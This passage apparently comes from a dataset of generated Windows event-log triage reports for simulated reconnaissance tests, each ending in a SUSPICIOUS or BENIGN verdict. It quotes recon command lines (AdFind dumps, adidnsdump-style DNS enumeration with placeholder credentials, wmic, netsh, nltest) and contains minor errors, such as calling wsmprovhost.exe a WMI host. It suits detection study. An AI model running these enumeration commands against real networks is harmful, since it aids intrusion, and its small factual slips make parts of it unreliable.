1. **EventID 4624 & 4672**: These events represent successful logons of the SYSTEM account. The logon type is 5, which indicates a service-type logon. The granting of privileges such as `SeDebugPrivilege` and others is common for the SYSTEM account and does not typically indicate malicious activity on its own.

2. **EventID 4798**: These events show requests to enumerate local group memberships. They involve the task host process (`taskhostw.exe`) checking membership for various accounts like ""Administrator"", ""admin_test"", ""DefaultAccount"", ""Guest"", and ""lplui"". This can suggest reconnaissance activity but could also be due to legitimate system processes.

### Application Log
- The logs show Windows Defender as active, indicating that the system's antivirus was running at the time of the events.

### Sysmon Log
1. **Process Creation (EventID 1 & 5)**:
   - Several processes initiated by `admin_test` involving PowerShell (`powershell.exe`) and other system processes indicate potentially suspicious behavior:
     - `powershell.exe` executed a script located in a temporary directory (indicative of possible malicious script execution).
     - Commands like `Get-NetDomainTrust`, `Get-ADDomain`, and `Get-ADGroupMember` suggest an attempt to gather domain and network information, which is typical of lateral movement or post-exploitation reconnaissance.

2. **Command Execution**:
   - Execution of `wevtutil.exe`, `whoami.exe`, and other commands can suggest enumeration activities.
   - The unusual use of `hostname.exe` and `conhost.exe` with the same patterns immediately after critical PowerShell commands can indicate attempts to obfuscate or standardize outputs in scripts.

### Windows PowerShell Log
- PowerShell logs confirm the execution of scripts doing network discovery and possibly attempting to enumerate domain trusts and local administrative users, which could suggest post-compromise actions typical of lateral movement or further information gathering by adversaries.

### Risk Assessment
- The presence of a PowerShell script in a temporary location running commands meant for domain enumeration and the various enumeration processes executed by the `admin_test` account indicate possible unauthorized reconnaissance.
  
### Recommendation
- Conduct a thorough investigation to confirm whether the user ""admin_test"" was performing authorized administrative tasks or if these are signs of compromise or probing post-compromise behavior.
- Investigate the origin and purpose of the PowerShell script found in the temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..`) to conclude if it is part of benign administrative activities or unauthorized access.
- Check for any anomalous network activity around the time of these entries and consider isolating Server002 for further assessment.
- Evaluate any access logs related to the `admin_test` account to determine if it was involved in other suspicious activities.
- If malicious activity is confirmed, consider using remedial actions as per institutional protocol, including possible user account management and cleanup of potential malicious artifacts.

### Resolution
- **SUSPICIOUS**: The activity within these logs requires further investigation to rule out or confirm malicious intent or unauthorized actions. Recommend heightened monitoring and analysis to gather more information before arriving at a conclusive resolution."
Adfind - Enumerate Active Directory Subnet Objects,"Upon analyzing the provided Windows event logs, the following findings were observed:

### Summary of Log Entries:

1. **Application Log:**
    - Entries are related to Windows Defender being in an ""ON"" state, indicating the security product is enabled.

2. **Sysmon Log:**
    - A sequence of legitimate system activities including Windows Update processes, Microsoft Edge updates, and Microsoft Malware Protection updates.
    - Frequent use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`, along with `cmd.exe` executing `AdFind.exe`, stands out as potentially suspicious.
    - `whoami` and `hostname` commands executed by `SERVER002\admin_test`.
    - Execution of `AdFind.exe` through `cmd.exe` might suggest a user or application is querying Active Directory, possibly indicative of reconnaissance.

3. **Security Log:**
    - Contains legitimate system activity, including SYSTEM login events and high-privilege tokens acquisition (4672 events).
    - Multiple `5379` events indicating failed credential access attempts which could signal attempts at unauthorized access to MicrosoftAccount.
  
4. **System Log:**
    - Normal Windows Update activity observed with no unusual errors or warnings.

### Analysis of Suspicious Activity:

- **Frequent Execution of Command-Line Tools:**
    - The presence of `AdFind.exe`, a tool used for Active Directory enumeration, suggests possible reconnaissance activity. Its execution from a temporary location could be a red flag if this was not a scheduled task or known administrative activity.
    - `wevtutil.exe` usage, often used to query or clear event logs, could also be suspicious if not conducted by an authorized user/process, especially when performed by `admin_test`.

- **Credential Reading Errors:**
    - Numerous `5379` events indicating failed credential access attempts on Microsoft Account services could be indicative of attempts to access credentials or configurations improperly.
  
- **Command Execution Patterns:**
    - `cmd.exe` running with a potentially obfuscated path to `AdFind.exe` suggests the execution could be trying to bypass normal security mechanisms.

### Conclusion:

Given the details and context of these logs, there are indicators suggestive of **SUSPICIOUS** activity warranting further investigation. The use of potential reconnaissance tools like `AdFind.exe` and the launch of system utilities like `wevtutil.exe` combined with failed credential access attempts requires a deeper forensic investigation to ensure there is no compromise or unauthorized access occurring.

### Recommendations:

1. **Verify User Activity:** Confirm whether `admin_test` was conducting authorized administrative activities. If not, secure the account.
2. **Inspect AdFind.exe Usage:**
   - Check for the legitimacy of `AdFind.exe` usage and if it's authorized. If unauthorized, consider it as part of malicious reconnaissance.
3. **Monitor for Anomalies:** Continue to monitor the machine and network traffic for more unusual behavior or attempts of privilege escalation.
4. **Strengthen Security Measures:** Implement advanced threat detection solutions if not in place and ensure all software, especially security patches, are up-to-date."
Wmic Group Discovery,"Based on the analysis of the given Windows event logs, here is a detailed assessment:

### Analysis:

1. **Process Execution and Parent-Child Relationships:**
   - Several processes (`hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `cmd.exe`) were executed with a high integrity level by the user `SERVER002\\admin_test`.
   - The processes `cmd.exe` and `wmic.exe` were executed with specific command-line arguments typically associated with environment enumeration. Command `cmd.exe /c wmic group get name` is used to retrieve group information via WMI, which may indicate a reconnaissance or enumeration activity.
   - Parent process `wsmprovhost.exe` was observed spawning these commands, which is typical in some remote management or script execution scenarios but might warrant scrutiny because it can be indicative of remote code execution or lateral movement if the execution context is unexpected.

2. **Execution from User Directories:**
   - The execution current directory for some processes is `C:\Users\admin_test\Documents\`, which might sometimes suggest script execution or batch file execution directly from user folders rather than system paths. While this can be legitimate, it's worth noting in this context.

3. **Abnormal Time Adjustments:**
   - There are multiple events indicating a change in system time (`EventID 4616`), which may indicate attempts to alter system logs or system timestamps, potentially for evasion purposes.

4. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is used for managing event logs, and its invocation may indicate log manipulation attempts, especially if not in line with known administrative logic.

### Threat Assessment:

- **Indicators of Potential Compromise:**
  - The series of commands using `cmd.exe` and `wmic.exe` without clear administrative needs can suggest reconnaissance actions associated with malicious activity.
  - The use of `wevtutil.exe` without a clear administrative task can be often associated with attempts to clear or tamper logs to hide tracks.
  - Multiple time adjustment events with `svchost.exe` as the process ID raise concern over possible timestamp manipulation.

### Conclusion:

- **Resolution: SUSPICIOUS**

These logs show a pattern of behavior that warrants further investigation. While there is no conclusive evidence of compromise, the combination of unexpected command-line activities, potential log manipulation, and time changes suggest a risk that these activities could be precursor actions to a more significant compromise.

### Guidance on How to Proceed:

1. **Conduct a Thorough Investigation:**
   - Investigate user `admin_test` activities to confirm whether these actions align with known legitimate tasks.
   - Verify if the observed commands and time changes were authorized or part of administrative scripts.
 
2. **Monitor and Track:**
   - Closely monitor the system for additional suspicious activities or deviations from the baseline.
   - Consider implementing auditing on sensitive actions involving time changes and usage of tools like `wevtutil.exe`.

3. **Review Policies and Permissions:**
   - Assess permissions and access levels for accounts with administrative privileges to ensure they are as minimal as necessary.

This approach ensures proactive steps to either clear the suspicion with definitive conclusions or intercept any malicious development before it leads to a full compromise."
Remote System Discovery - ping sweep,"Upon reviewing the provided event logs from the Windows host, several points of interest stand out. Here is a detailed analysis of the logs:

1. **PowerShell Activity**:
   - There are instances of PowerShell execution with the `-ExecutionPolicy Restricted` flag. While `Restricted` is the default execution policy and prevents unauthorized scripts, seeing multiple script executions across a short interval should be scrutinized further. There is no specific indication of running potentially harmful scripts `Write-Host 'Final result: 1'` and another complex script checking `.inf` files. These PowerShell scripts do not appear immediately malicious from the text, but analysis of script content would provide further clarity.

2. **Network Scanning Activity**:
   - There are a series of command lines associated with `cmd.exe` running a batch of pings. This is a classical method used for network scanning to discover active hosts within a subnet (`192.168.1.x`). The presence of such automated ping sweeps might suggest an internal discovery phase.
   - It raises a red flag, particularly due to parallel occurrences of batch ping requests, which is often indicative of lateral movement or internal reconnaissance.

3. **Execution of svchost.exe, wsmprovhost.exe, wevtutil.exe**:
   - These are standard system processes on Windows systems, but excessive executions or unusual parentage in process trees can indicate misuse. They do not appear explicitly irregular from the current logs but should be noted.

4. **Sysmon Logs**:
   - Multiple Sysmon events log harmless processes like `conhost.exe`, `conhost.exe`, and `wbem\\WmiPrvSE.exe`. Process creation from administrators during this time span (`admin_test` user) executing `whoami`, `hostname`, and batch pings.
   - The activity here seems driven by `admin_test`, an admin-level context, which performs typical administrative tasks but mixed with scanning activity.

5. **Security Logs**:
   - Several logon events (event ID 4624) with elevated privileges from the `admin_test` account. These events often represent legitimate administrative activities unless abused.
   - Events indicate attempted authentications (event ID 5379), which failed possibly due to credential issues. Multiple failed authentication checks imply routine but unsuccessful attempts which could possibly indicate malicious probing in a different context.

**Conclusion**:
Given the network scanning activity with pings and use of administrative PowerShell scripts in conjunction with the execution context of `admin_test` user, these activities indicate possible reconnaissance or preparatory stages of a larger attack.

**Resolution**: **SUSPICIOUS**
- The activity does not conclusively confirm malicious actions but requires investigation. While some of the activity could be associated with legitimate administrative tasks, the presence of bulk pings and consecutive PowerShell invocations within a short timeframe warrant further exploration.
- Recommendations include verifying the legitimacy of the 'admin_test' user's recent activities, reviewing the full logs of the executed PowerShell content, and monitoring network traffic for any abnormal behaviors indicative of further unauthorized reconnaissance or data exfiltration attempts."
Windows Internal pktmon set filter,"### Detailed Analysis:

Upon analyzing the provided Sysmon, System, and Security logs, the following observations can be made:

1. **Process Execution:**
    - **`wevtutil.exe` and `conhost.exe`:** Both these legitimate Windows processes are executed frequently. The `wevtutil.exe` is a command-line utility for managing event logs and publishers. However, if not well understood, its execution alongside conhost.exe might suggest someone is scripting or automating tasks on the host. The specific scripts or tasks, however, are not directly observable from these logs, and could be benign.
    
    - **`hostname.exe` and `whoami.exe`:** These are benign sys admin commands providing system hostname and the currently logged user's identity, respectively. Their execution alone does not indicate malicious activity, but if combined with other suspicious executables, could suggest reconnaissance behavior.
    
    - **`cmd.exe` executing `pktmon.exe`:** This is a cause for concern. `pktmon.exe` is a Packet Monitor tool which is legitimate but its use might suggest packet sniffing or monitoring network activities, which could imply an attempt to capture sensitive data. Running `cmd.exe` with packet monitoring on port 445 is notable because port 445 is typically used by Windows SMB protocol. This could suggest unauthorized monitoring or manipulation attempts of SMB traffic.

2. **Kernel and Time Events:**
    - The system logs show changes in system time which could raise suspicion. Changing system time can be a tactic used by attackers to manipulate time stamps of logs, thereby obfuscating their traces. The alteration of system time twice consecutively without clear cause could imply malicious intent.

3. **Security Logs:**
    - **Event ID 4616:** Indicates a change in system time which correlates with the system logs and further raises suspicion.

### Assessment:

- **Anomalous Behavior:**
    - Constant execution of `wevtutil.exe` and `conhost.exe`, particularly in quick succession, may indicate a script running but isn't inherently malicious without further unusual context.
    - Use of `pktmon.exe` on a critical network port (445) is significantly suspicious behavior as it can imply network eavesdropping, especially if unauthorized or unexpected.
    - Alteration of system time is particularly notable, suggesting intent to possibly obscure logging details.

Taken together, these elements form a suspicious narrative which warrants deeper investigation.

### Conclusion:

**Resolution: SUSPICIOUS**

While many of the activities and commands seen in the logs can have legitimate uses, the combination of frequent event log management, network monitor tool use on sensitive ports, and system time manipulation without a clear authorized reason aligns more closely with potential reconnaissance and covert logging activity. It is recommended to conduct further investigations focusing on:
- Verifying the legitimacy of the user's actions associated with `SERVER002\admin_test`.
- Reviewing historical logs and any correlated network activity.
- Investigating configurations and scripts that may have triggered cmd and PktMon execution.
- Checking for any unauthorized time change policies or scripts."
Discover System Language with dism.exe,"Based on the provided logs, here is a detailed analysis of potentially suspicious or anomalous activities:

1. **Time Discrepancy Events:**
   - System logs indicated a time discrepancy, where the system time was adjusted backwards from `16:24:29.5224429` to `16:24:22.3694496` and again adjusted slightly, observed in Event IDs 3569 and security log Event ID 4616. This can occur under normal circumstances, such as time synchronization issues or proper NTP (Network Time Protocol) synchronization. However, unexplained and repeated instances of time changes can sometimes indicate an attempt to obscure the timeline of activities on the system by an attacker.

2. **Unusual Logon Activities:**
   - Security logs show administrative privileges being associated with the user `admin_test`, including a range of powerful privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., in Event IDs 4672. The elevation of privileges itself isn't necessarily suspicious if it aligns with a user's role. However, if this user account is not commonly seen performing administrative tasks or if there are unexplained uses of this account, it could point to a concern.

3. **Process Execution Review:**
   - Sysmon logs cover a range of processes executed by the user `SERVER002\\admin_test`. Common Windows binaries like `whoami.exe`, `cmd.exe`, and `dism.exe` are executed, with `cmd.exe` running a DISM command. While these commands can be legitimate, they should be reviewed concerning what changes were made and why the DISM command is being called, especially if it is being used to gather information or modify settings covertly.
   - Frequent executions of `wevtutil.exe` are logged, a tool used to fetch and clear event logs. This can sometimes suggest log tampering, which might be an indication of trying to hide malicious traces.
   - Multiple instances of Microsoft Edge Update setup and registration processes (`MicrosoftEdgeUpdate.exe` and related binaries) are invoked in the Sysmon logs. These processes appear repetitive, and while benign under typical update procedures, unexpected automated, or frequent updates could be abnormal, especially if triggered outside standard routine schedules.

4. **Benign Edge Update Activity:**
   - The numerous entries relating to `MicrosoftEdgeUpdate.exe` and similar processes primarily indicate activity associated with browser updating tasks. They point towards a potentially legitimate update cycle for Microsoft Edge, unless coupled with abnormal signifiers usually related to browser hijacking or persistence mechanisms.

**Assessment and Recommendations:**
1. **Benign:**
   - Many activities seen (e.g., Microsoft Edge updates and some standard service executions) are consistent with typical OS and application management and updates. 

2. **Suspicious:**
   - The main component raising suspicion is the system time modification. Unusual logon types and commands run under administrative contexts that aren't usually explicitly associated with any authorized or planned configuration activities could be evaluated for legitimacy.
   - Verify if the processes associated with `admin_test` were sanctioned and if any reports or incidents correlate with unexpected system behavior around these timestamps.
   - Review the effectiveness and scope of system time synchronization policies to avoid potential misalignment.

3. **Next Steps:**
   - Given potential signs of anomalous behavior with time settings and administrator activity, categorize this observation as **SUSPICIOUS**.
   - Further investigate specific configurations, network callbacks, examine other hosts for similar patterns, and confirm with business units about planned edge updates or tool usages.
   - Consider enhancing logging retention around critical actions and ensure alerting for unauthorized time changes and admin-level access.

ENCAPSULATED CONCLUSION: **SUSPICIOUS**."
Adfind - Enumerate Active Directory Admins,"Upon reviewing the provided Windows event logs, several observations can be made regarding potentially suspicious or evasive activity executed on the machine, specifically under the context of the user ""SERVER002\admin_test"". Here is a breakdown of the findings:

### Observed Activities

1. **PowerShell Execution**:
   - There is a log entry indicating the execution of `powershell.exe` by the user `SERVER002\admin_test`:
     - **Process ID 5956** with the image path `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`.
   - Use of PowerShell can often indicate malicious intent if not used for routine administrative tasks, especially without a clear command-line context.

2. **Repeated use of `wevtutil.exe` and `conhost.exe` by the same user**:
   - Several entries show the execution of `wevtutil.exe` and `conhost.exe`. 
   - `wevtutil.exe` is used primarily for managing and querying the event logs. Its repeated execution, especially if unauthorized, requires further investigation.
   - Examples:
     - **Process ID 4288**, 2804, 3532, 4828, 6344 for `wevtutil.exe`.
     - Associated conhost processes indicate possible command and control or even script activity which could mask malicious behavior.

3. **Execution of `cmd.exe` with external file usage**:
   - Event ID `18023` indicates the execution of `cmd.exe` with a command line attempting to execute `AdFind.exe`:
     - Command Line: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -sc admincountdmp`.
   - `AdFind.exe` is a legitimate utility often used by attackers for reconnaissance in Active Directory environments. Running from a temporary directory is a potential indicator of compromise.
   - This activity is highly suspicious as it may indicate an attempt to extract information from Active Directory, possibly by escalating privileges or gathering sensitive information on the network.

4. **Security Logs Indicate Potentially High Privileges in Use**:
   - Event ID `4672` shows that the `SYSTEM` account was granted high-level privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which are standard for the SYSTEM account but important to monitor when suspicious activities like the ones above are occurring.

### Assessment

- The combination of executing reconnaissance tools (AdFind), PowerShell, and potentially manipulating event logs hints at malicious or at least suspicious activity by the `admin_test` user or an entity impersonating this user. The use of tools from non-standard directories further raises concerns about the actions’ intentions.
- The activity aligns with common post-exploitation steps used by attackers to collect information and potentially prepare for further exploits or data exfiltration.

### Resolution: **SUSPICIOUS**

While it is not confirmed that the activities are definitively malicious due to lack of observed exfiltration attempts or visible impacts, the context suggests activities warrant further investigation. It's crucial to perform the following steps:

- **Immediate Actions**:
  - Isolate the machine to prevent potential lateral movement or further unauthorized access.
  - Analyze PowerShell logs and script block logging, if available, to determine the specific actions taken by the PowerShell process.
  - Check for other files or remnant configurations related to AdFind.exe and investigate how this tool was deployed on the system.

- **Investigation**:
  - Conduct a thorough forensic analysis on the SYSTEM account’s recent activities and examine its privileges usage.
  - Inspect network logs for data exfiltration indicators or unauthorized access attempts.
  - Review group policy settings and user privileges, particularly for the `admin_test` account.

This situation requires close monitoring and additional investigation to confirm whether a malicious breach occurred and to ensure any potential threat actors are identified and their methods understood."
Remote System Discovery - adidnsdump,"The Windows event logs provided in this investigation reveal a range of activities on the system. Here’s a detailed analysis of potentially suspicious or malicious activity found within the logs:

1. **Unusual PowerShell Execution:**
   - EventID 403 indicates the execution of a PowerShell command, which includes downloading a Python executable from the internet (`https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe`) and then executing it. This is potentially suspicious as PowerShell is often used in attack scenarios for downloading and executing payloads.

2. **Python Installation:**
   - There are multiple events related to the installation of Python (e.g., EventIDs 11707, 1033) indicating the installation of Python 3.10.4 and related components. If Python was not expected to be installed by the user or administrator manually, this could be a sign of automation or scripting capability being set up by a malicious actor.

3. **Cmd.exe Execution with Suspicious Parameters:**
   - EventID 18018 shows `cmd.exe` being executed with parameters targeting sensitive data or internal hosts (`""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\venv_data\Scripts\script"" -u domain\user -p password --print-zones 192.168.1.1`). This involves potentially hardcoded credentials, which is a strong indicator of malicious activity attempting to escalate privileges or gather information.

4. **Execution of Wevtutil:**
   - There are several instances (EventIDs 17990, 17994, 17998) of `wevtutil.exe` execution, which is a tool used to manage event logs. Malicious actors often use `wevtutil` to clear event logs to hide their tracks.

5. **Persistence Mechanisms:**
   - The presence of tasks related to `WaaSMedicAgent.exe`, `UsoClient.exe`, and `PLUGscheduler.exe` (Events around IDs 18042 to 18053) could be part of the system's regular operations or updates. However, they need to be looked into for any signs of misuse or scheduled task creation by unauthorized users.

6. **High Privilege Command Execution:**
   - EventID 4672 highlights that the SYSTEM account attempted to use several high-level privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This could be related to regular operations but should be reviewed in the context of other suspicious activity on the system.

Given the analysis, the following assessment can be made:

**Assessment: SUSPICIOUS**
- The combination of suspicious PowerShell execution, cmd.exe script running with hardcoded credentials, usage of wevtutil.exe, and unexpected Python installation raises potential security concerns.
- While these activities may have legitimate explanations—such as scheduled updates or maintenance scripts—they align with known tactics used by adversaries to establish a foothold, escalate privileges, or exfiltrate data.

**Recommended Actions:**
- Conduct a thorough investigation into the context and origin of these activities, particularly focusing on who executed the PowerShell and cmd.exe commands.
- Validate the need for Python installation and review associated scripts for any malicious intent.
- Check network connections and external accesses for any signs of data exfiltration.
- Monitor the CEO’s system closely for additional suspicious activity and consider running a comprehensive security scan to determine if there are other indicators of compromise.
- Ensure logging settings are retained and potentially enhance log monitoring to detect similar activities in the future.

Resolution: **SUSPICIOUS** (further investigation needed)"
List Windows Firewall Rules,"### Detailed Analysis of Logs

1. **Environment Overview**:
   - **Machine Identification**: Server002.
   - **Primary User**: SERVER002\\admin_test.
   - **Date of Events**: October 21, 2024.

2. **Suspicious or Anomalous Behavior**:

   - **Repeated Execution of Built-in Utilities**:
     - `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `netsh.exe` were executed in quick succession.
     - These are standard Windows utilities, but frequent execution in a short time span by a user (admin_test) suggests either legitimate administrative tasks or obfuscation attempts.
   
   - **Command Execution**:
     - **CommandLine for cmd.exe**: `""cmd.exe"" /c netsh advfirewall firewall show rule name=all`
     - This command is used to display all firewall rules. It can be benign but could also indicate an attacker probing firewall settings.

   - **Process Creation**:
     - All process executions maintain high integrity levels and originate from SYSTEM32, indicating legitimate binaries.

   - **Parent-Child Process Relationships**:
     - Many processes (e.g., `whoami`, `hostname`) were spawned by `wsmprovhost.exe`, a legitimate Windows Management Instrumentation (WMI) provider host process. This behavior can sometimes indicate script-based malware or remote script execution.

3. **Security and Windows Update Activity**:
   - **Windows Defender Activity**: Verified to be active with the state “SECURITY_PRODUCT_STATE_ON”, implying that defender is functional.
   - **Windows Update Events (EventID 44, 43, 19)**: Indicates recent updates being applied for Security Intelligence Updates for Microsoft Defender Antivirus. Legitimate and regular behavior.

4. **Security Auditing**:
   - **Credentials Manager Auditing (EventID 5379)**:
     - Several audit failures with return codes indicating potential issues in accessing credentials.
     - While this could be a normal occurrence, recurring errors or failures within system logs could indicate misconfigured services or attempts to utilize cached credentials for unauthorized access.

5. **Windows System Update and Defender Updates**:
   - **System Log Entries**: Reflect ongoing and successful antivirus updates. Systems appear to be in sync with Microsoft Defender.

6. **General Observations**:
   - User’s high integrity actions are observed across numerous processes, consistent with routine administrative tasks.
   - The timeline of events points to a brief period of intense activity that may warrant further clarity on the user's actions.

### Situation Assessment
No overt malicious activities are presented within these logs. However, there are entries that spark curiosity and suggest potential probing or reconnaissance, notably the repetitive execution of system utilities and the network/firewall check.

### Final Resolution:
**SUSPICIOUS** - The observed behaviors, while potentially benign, mandate further investigation to clarify the user's purpose, particularly concerning the execution of network-related commands and frequent use of system utilities under a high privilege account.

### Guidance on How to Proceed
- **Corroborate Activities**: Verify if SERVER002\\admin_test performed routine maintenance or troubleshooting during this time.
- **Review Other Logs and Sensors**: Check potential SIEM logs for correlated alerts or patterns.
- **Monitor Future Activity**: Implement additional monitoring on `Server002` to detect if similar command executions occur, especially from remote sources.
- **User Verification**: Establish contact with admin_test to verify actions and gather explanations."
Win32_PnPEntity Hardware Inventory,"Upon analyzing the provided Windows event logs, here's a breakdown of noteworthy findings:

1. **Frequent Execution of System Utilities**: The logs indicate multiple executions of standard utilities such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` by the user `SERVER002\\admin_test`. While these utilities are legitimate system programs, their frequent invocation in a short period could suggest script execution or automated task, often seen in enumeration or initial foothold stages by an attacker.

2. **PowerShell Activity**: There is an instance of PowerShell being invoked with a command to collect system information (`Get-WMIObject Win32_PnPEntity...`). The use of PowerShell for data collection is commonly associated with benign and administrative tasks. However, it can also be leveraged for reconnaissance by malicious actors. The command does not appear to be obfuscated, which reduces the immediate suspicion of malicious intent.

3. **Microsoft Edge Update Activity**: The logs show execution of `MicrosoftEdgeUpdate.exe` from a temporary directory, which is typically standard for update processes. However, the temporary directory usage can sometimes also indicate an attempt to masquerade malicious activity as normal system operations.

4. **Time Synchronization Events**: There are multiple time change events recorded in the system and security logs. These events can occur due to system time adjustments and are not inherently malicious without additional context indicating tampering.

5. **Execution of Console Host Processes**: The `conhost.exe` is frequently listed as a child process in conjunction with these activities, which is typical behavior for command execution but stands out when executed multiple times within a short period.

6. **Execution of `wsmprovhost.exe`**: Observing `wsmprovhost.exe` as a parent process of legitimate utilities (such as `whoami.exe` and `PowerShell`) indicates potential remote management or script execution as this process is associated with PowerShell remoting activities.

**Assessment and Resolution**:
- The activities of executing system utilities, invoking PowerShell for data collection, and Edge update processes aren't immediately indicative of malicious actions. However, given the context—especially frequent execution and use of PowerShell—they can be indicative of broader automated or manual reconnaissance efforts.
- Due to the lack of clear malicious indicators such as obfuscation, external connections, or known malicious hashes, these logs do not confirm a compromise but do present behavior that warrants further investigation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate any additional logs for network connections or further PowerShell command activities that could indicate external C2 or data exfiltration attempts.
- Review the recent changes in security configurations or newly scheduled tasks on this host that could explain the frequent use of administrative utilities.
- Monitor for consistency and correlation of similar behavior on other machines within the network to assess for signs of lateral movement.
- Consider implementing more stringent PowerShell logging, such as module logging and script block logging, to gain deeper visibility into script activities."
operating system discovery,"Upon analysis of the provided logs, here are my observations and findings:

### System Log
- **Time Services and svchost.exe**:
  - Numerous entries indicate that there were adjustments to the system time executed by `svchost.exe`, which is a valid host process for many Windows services but can also be exploited by malware.
  - The changes to system time involve small adjustments which might indicate synchronization rather than tampering.

### Windows PowerShell Log
- **PowerShell Invocation**:
  - PowerShell logs indicate the execution of `powershell.exe` to query system information (`Get-CimInstance Win32_OperatingSystem`) and output redirection (`Out-null`).
  - This is not highly suspicious by itself, as it may relate to system or administrative tasks, but repeated or unexpected uses could imply scripting activity that merits attention.

### Security Log
- **Time Change Events**:
  - The security logs also record system time changes corresponding to the system log, pointing towards synchronized time updates rather than rogue activity.

### Sysmon Log
- **Process Executions**:
  - Legitimate system utilities such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `HOSTNAME.EXE` are logged under `SERVER002\admin_test` user context.
  - The `whoami.exe` and `HOSTNAME.EXE` processes alongside `PowerShell` execution could suggest an administrator querying information about the system and user environment.
  - Execution patterns appear systematic and consistent with legitimate administrative routines.

### Application Log
- **Software Protection Platform Service**:
  - A log entry for the Software Protection Platform Service (`sppsvc.exe`) relating to time adjustments.
  - This driver process is expected for genuine system functions as part of Windows activation and integrity mechanisms and does not appear connected to suspicious activity.

### Assessment
- **Time Synchronization**: The series of logs involving time adjustments between `NewTime` and `OldTime` for the `svchost.exe` process do not suggest deliberate tampering but rather expected synchronization behavior.
- **Administrative Actions**: The PowerShell, `whoami.exe`, and `HOSTNAME.EXE` command instances are typically used by system administrators during routine queries or automated scripts. Their association with `admin_test`, particularly without any clear evidence of misuse or malware payloads, suggests legitimate activity.

### Conclusion
Given the findings, the logs exhibit regular system activity including administrative tasks and time synchronization. There are no distinct indicators of compromise (IoC) such as unauthorized privilege escalation, unusual network connections, or presence of known malicious scripts related to malware campaigns.

### Resolution
- **BENIGN**: The activity observed in the log files appears normal and indicative of typical system operations and legitimate administrative actions. No further immediate action is necessary unless additional suspicious indications arise. However, continuous monitoring is advisable to ensure that the behavior remains consistent and absent of malicious indicators."
Adfind - Enumerate Active Directory Trusts,"After reviewing the provided Windows event logs, here is a detailed analysis of the behavior observed:

1. **Process Execution**:
   - The logs show several executions of system processes such as `TiWorker.exe`, `TrustedInstaller.exe`, `SecurityHealthService.exe`, `PowerShell.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `MicrosoftEdgeUpdate.exe`.
   - The appearance of `TiWorker.exe`, `TrustedInstaller.exe` and `SecurityHealthService.exe` with an `NT AUTHORITY\SYSTEM` user is typical for system service updates and Windows health service operations.
   - However, there is a notable `PowerShell.exe` execution under the `SERVER002\admin_test` user, followed closely by several instances of `wevtutil.exe` and `conhost.exe`, both linked to the same non-system user. This sequence is unusual and warrants further attention.

2. **Command Line Execution**:
   - There is an instance where `cmd.exe` is executed with the command line targeting `AdFind.exe` with the `-gcb -sc trustdmp` parameters. This can be indicative of reconnaissance activities targeting Active Directory Trusts. The path also suggests it is running from a temporary directory, which is not typical and suggests potential malicious activity.

3. **PowerShell Execution**:
   - The `PowerShell.exe` is detected without evident command line parameters, but its execution within the context of potential malicious behavior should be flagged for deeper inspection.

4. **Privilege Escalation**:
   - The event log records show the enabling of multiple privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which are often used for privilege escalation. This is linked with the `SYSTEM` account during a successful logon event.

5. **Network and Firewall Changes**:
   - The logs don't clearly document any direct network manipulation or firewall rule changes, but usage of utilities like `wevtutil.exe` might imply attempts to prep the system for unauthorized access or cleanup of event logs.

6. **Repeated Events involving Microsoft Edge Update**:
   - The logs show multiple `MicrosoftEdgeUpdate.exe` processes, which is a normal behavior if it coincided with a browser update or installation routine.

**Assessment**:
- The execution of `PowerShell.exe` by the `ADMIN_TEST` user and subsequent usage of `AdFind.exe` and `wevtutil.exe` are activities that strongly suggest suspicious behavior. The pattern indicates potential reconnaissance and an attempt to cover tracks or manipulate logs.

**Threat or Risk Identified**:
- The presence of AdFind, the nature of its command usage, and the sequence of events surrounding it indicate a possible compromise, likely stemming from an account misuse or exploitation.

**Guidance on How to Proceed**:
1. Immediate containment: Disable or review any activities and permissions associated with the `SERVER002\admin_test` user.
2. Deep dive and analysis: Conduct a deeper forensic investigation into the `PowerShell.exe` command history and review network activity logs during the same timeline.
3. Review system integrity: Ensure that Windows Defender definitions are up-to-date and perform a full scan on `Server002`.
4. Evaluate logs systematically: Investigate any further anomalous sequences by potentially compromised accounts.
5. Consider alerting your incident response team for further investigation and remediation steps.

**Resolution**:
- **SUSPICIOUS** - The logs contain activity that does not look right, particularly the execution pattern of `PowerShell.exe`, use of `AdFind.exe`, and processes under the non-system `ADMIN_TEST` user, and needs more in-depth investigation."
Remote System Discovery - nltest,"Upon reviewing the provided logs, several observations can be made that might indicate potentially suspicious activity, but do not confirm malicious activity outright. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Credential Access Attempt (Event ID 5379)**:
   - Numerous entries show repeated attempts to access credentials with the same `ClientProcessId` (2528) and `ReturnCode` (3221226021), which commonly indicates an ""access denied"" error. These involve `MicrosoftAccount:user=02txoixylodcstop` and related entries. Repeated unauthorized access attempts could suggest an attempted breach or misconfiguration.

2. **Elevation of Privileges (Event ID 4672)**:
   - An event where the `SYSTEM` account receives special privileges (`SeDebugPrivilege`, etc.) typical for system-level tasks. While this could be routine if running specific system processes, elevated privileges should be closely monitored to ensure no unapproved actions.

3. **Unusual Process Creation (Sysmon Events)**:
   - The logs show consistent use of system utilities like `cmd.exe`, `whoami.exe`, `nltest.exe`, suggesting system reconnaissance or management activities by `SERVER002\admin_test`, a user who seems to be executing several command-line operations.
   - The commands executed do not seem inherently malicious, yet the high frequency and variety might warrant closer inspection.
   
4. **Network Misconfiguration or Testing (Sysmon Event ID 1)**:
   - Use of `nltest.exe` which is used for network-related operations like discovering domain controller information. This may indicate network reconnaissance or testing.

5. **Product or Component-Based Actions**:
